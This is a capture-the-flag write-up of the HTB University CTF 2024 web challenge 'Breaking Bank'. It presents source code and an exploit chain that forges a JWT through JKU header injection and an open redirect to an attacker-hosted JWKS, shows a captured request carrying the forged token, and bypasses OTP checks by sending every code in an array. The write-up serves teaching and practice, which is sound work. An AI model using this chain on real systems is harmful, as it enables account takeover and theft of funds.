+++
author = "Chic0s"
title = "WEB - Breaking Bank"
date = "2024-12-17"
description = "Challenge during the HTB Univ CTF of 2024"
tags = [
    "HTB","UNIV","CTF","2024"
]
+++
Website Analysis
----------------

**CryptoX** is a cryptocurrency management platform that allows users to:

*   Track market prices
*   Manage portfolios
*   Send transactions

For added security, transactions can only be conducted between friends. Users can monitor their assets, market changes, and transaction history through an intuitive, dark-themed interface.

### Features

##### **Introduction**

To perform a transaction, the following conditions must be met:

1.  You must be friends with the recipient.
2.  You must own cryptocurrency.

#### **Friend Request**

*   The friend request can be initiated by either the sender or the recipient of the transaction.
*   The request must be accepted by the receiving user.

#### **Transaction**

*   A transaction requires an **OTP code** for validation.

### Code Analysis

#### **Objective**

In the project directory, there is a file named **flagService.js**.  
The code checks the financial status of the account `financial-controller@frontier-board.htb`.  
If the **CLCR wallet balance** is zero or less, the file `/flag.txt` will be displayed.
```js
    import { getBalancesForUser } from '../services/coinService.js';
    import fs from 'fs/promises';
    
    const FINANCIAL_CONTROLLER_EMAIL = "financial-controller@frontier-board.htb";
    
    /**
     * Checks if the financial controller's CLCR wallet is drained
     * If drained, returns the flag.
     */
    export const checkFinancialControllerDrained = async () => {
        const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL);
        const clcrBalance = balances.find((coin) => coin.symbol === 'CLCR');
    
        if (!clcrBalance || clcrBalance.availableBalance <= 0) {
            const flag = (await fs.readFile('/flag.txt', 'utf-8')).trim();
            return { drained: true, flag };
        }
    
        return { drained: false };
    };
```
### Code OTP
```js
    export const generateOtp = () => {
      return Math.floor(1000 + Math.random() * 9000).toString();
    };
    
    export const setOtpForUser = async (userId) => {
      const otp = generateOtp();
      const ttl = 60;
    
      await setHash(`otp:${userId}`, { otp, expiresAt: Date.now() + ttl * 1000 });
    
      return otp;
    };
```
The OTP code logic is found in the file `challenge/server/services/otpService.js`.

*   The OTP is a 4-digit code, generated between `0000` and `9999`.
*   Brute-forcing the OTP using tools like Burp Suite's **Intruder** is not possible due to a middleware that controls the flow.

A method to **bypass the OTP** must be identified.

### Code JWKS
```js
    import crypto from 'crypto';
    import jwt from 'jsonwebtoken';
    import axios from 'axios';
    import { v4 as uuidv4 } from 'uuid';
    import { setKeyWithTTL, getKey } from '../utils/redisUtils.js';
    
    const KEY_PREFIX = 'rsa-keys';
    const JWKS_URI = 'http://127.0.0.1:1337/.well-known/jwks.json';
    const KEY_ID = uuidv4();
    
    export const generateKeys = async () => {
        const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
            modulusLength: 2048,
            publicKeyEncoding: { type: 'spki', format: 'pem' },
            privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
        });
    
        const publicKeyObject = crypto.createPublicKey(publicKey);
        const publicJwk = publicKeyObject.export({ format: 'jwk' });
    
        const jwk = {
            kty: 'RSA',
            ...publicJwk,
            alg: 'RS256',
            use: 'sig',
            kid: KEY_ID,
        };
    
        const jwks = {
            keys: [jwk],
        };
    
        await setKeyWithTTL(`${KEY_PREFIX}:private`, privateKey, 0);
        await setKeyWithTTL(`${KEY_PREFIX}:jwks`, JSON.stringify(jwks), 0);
    };
```
The JWKS code is located in `challenge/server/services/jwksService.js`.  
The **public keys** can be accessed at the endpoint: `/.well-known/jwks.json`.

  

Solve 
------

#### **Introduction**

To solve the challenge, we need to:

1.  Craft a JWT token to access the account `financial-controller@frontier-board.htb`.
2.  Send a friend request to an account we control.
3.  Bypass the OTP to transfer all the **CLCR cryptocurrency** to our account and trigger the flag.

### Crafter un token JWT

The server checks that the **JKU header** begins with `http://127.0.0.1:1337/`.

```js 
    // TODO: is this secure enough?
    if (!jku.startsWith('http://127.0.0.1:1337/')) {
        throw new Error('Invalid token: jku claim does not start with http://127.0.0.1:1337/');
    }
```
If we can upload or redirect to a file we control, we can modify the JWT signature and use our own public key.

**Steps:**

1.  Refer to the guide: [JWT Authentication Bypass via JKU Header Injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection).
2.  Use the **JWT Editor add-on** in Burp Suite to generate a token.
3.  Retrieve the public key using the option **“Copy Public Key as JWK”**.
4.  Start an HTTP server to host the public key.

### Open Redirect

An **open redirect** vulnerability exists in `challenge/server/routes/analytics.js`.
```js
    export default async function analyticsRoutes(fastify) {
        fastify.get('/redirect', async (req, reply) => {
            const { url, ref } = req.query;
    
            if (!url || !ref) {
                return reply.status(400).send({ error: 'Missing URL or ref parameter' });
            }
            // TODO: Should we restrict the URLs we redirect users to?
            try {
                await trackClick(ref, decodeURIComponent(url));
                reply.header('Location', decodeURIComponent(url)).status(302).send();
            } catch (error) {
                console.error('[Analytics] Error during redirect:', error.message);
                reply.status(500).send({ error: 'Failed to track analytics data.' });
            }
        });
```
We modify the JWT token's **JKU header** to include:

    http://127.0.0.1:1337/api/analytics/redirect?url=http://csrf.Chic0s.fr/jwks.json&ref=foo

#### **Adding Friends**

We can add our own account as a friend:

1.  Send a friend request.
```    
        POST /api/users/friend-request HTTP/1.1
        Host: 94.237.59.180:58323
        Accept: application/json, text/plain, */*
        Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/json
        Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjcxYWRmMGZmLTAyOWMtNGM3MC04ZTMwLTg3YTg4MjAzMWZiNiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6MTMzNy9hcGkvYW5hbHl0aWNzL3JlZGlyZWN0P3JlZj1odHRwczovL2dvb2dsZS5jb20mdXJsPWh0dHBzOi8vY3NyZi5jaGljMHMuZnIvandrcy5qc29uIn0.eyJlbWFpbCI6ImZpbmFuY2lhbC1jb250cm9sbGVyQGZyb250aWVyLWJvYXJkLmh0YiIsImlhdCI6MTczNDEwMTIzOX0.PBcL7JnAd1_HVv5335fUOHeA7LUjRBBdh1um86jk0In1J1bqHYwYDEJ_LUREy46AZ0nODr3KzGut9Yn9wYYXGwGa5usyxMW2bC6lW0bSKX_m_epuBEea4b60-4XgBHaz173sy_aWM5datK1mnBOL6UA6YEZwpFW-rfbu-VCvADL_HjR62aSKNVC5mbwsuXJh8oxQBVXGDyTlKItBgYmAK3gO3fOwIimnin98WD0aNKHZ3c8h_gFIm8lcXBPUHe_fpFPx3dY_MTTxf15sexlcdFjXluXrV4Vv520ZaRkxw4a69LuaAB67wKf2HUtwMktQmhHlCwzwoqZYzHwN0XDO1w
        Content-Length: 14
        Origin: http://94.237.59.180:58323
        Connection: keep-alive
        Referer: http://94.237.59.180:58323/friends
        X-PwnFox-Color: red
        Priority: u=0
        
        {"to":"ee@ee"}
```    
2.  Accept the request on our controlled account.

### Admin's Wallet Balance

By checking the admin’s balance for **CLCR**, we find that it holds:
```js
    [{"symbol":"CLCR","name":"Cluster Credit","availableBalance":25122323118},{"symbol":"BTC","name":"Bitcoin","availableBalance":8819693561},{"symbol":"ETH","name":"Ethereum","availableBalance":5578363570},{"symbol":"DOGE","name":"Dogecoin","availableBalance":55751899}]
```
CLCR : `25122323118` 

The goal is to drain this balance.

### Bypass OTP 
```js
        // TODO: Is this secure enough?
        if (!otp.includes(validOtp)) {
          reply.status(401).send({ error: 'Invalid OTP.' });
          return;
        }
      };
    };
```
The OTP validation logic uses an `includes` function.

To bypass it:

*   Generate a list of all possible OTP values (`0000` to `9999`).
*   Use this list to exploit the OTP validation mechanism.

Example :  
```
    {"to":"ee@ee","coin":"CLCR","amount":25122323118,"otp":["0000", "0001", "0002", "0003", "0004", "0005", "0006", "0007", "0008", "0009".."9999"]}
```
### Conclusion

Finally, log in with the account `financial-controller@frontier-board.htb` and access `/api/dashboard`.

This action will display the flag 🎉.